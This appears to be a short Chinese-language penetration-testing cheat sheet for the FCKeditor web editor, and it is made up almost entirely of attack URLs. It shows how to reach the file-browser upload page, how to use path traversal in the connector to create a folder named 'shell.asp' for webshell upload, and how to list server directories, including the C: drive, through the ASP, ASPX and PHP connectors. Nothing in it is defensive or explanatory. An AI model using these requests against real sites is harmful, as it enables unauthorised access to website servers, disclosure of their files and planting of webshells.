1、FCKeditor/editor/fckeditor.html
==================================

FCKeditor/editor/fckeditor.html不可以上传文件，可以点击上传图片按钮再选择浏览服务器即可跳转至可上传文件页，可以查看已经上传的文件。

2、根据xml返回信息查看网站目录
==============================

    http://www.-sec.org/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&Type=Image&CurrentFolder=../../../&NewFolderName=shell.asp

3、获取当前文件夹
=================

    FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
    FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/
    FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=/

4、游览c盘
==========

    /FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&Type=Image&CurrentFolder=c:/
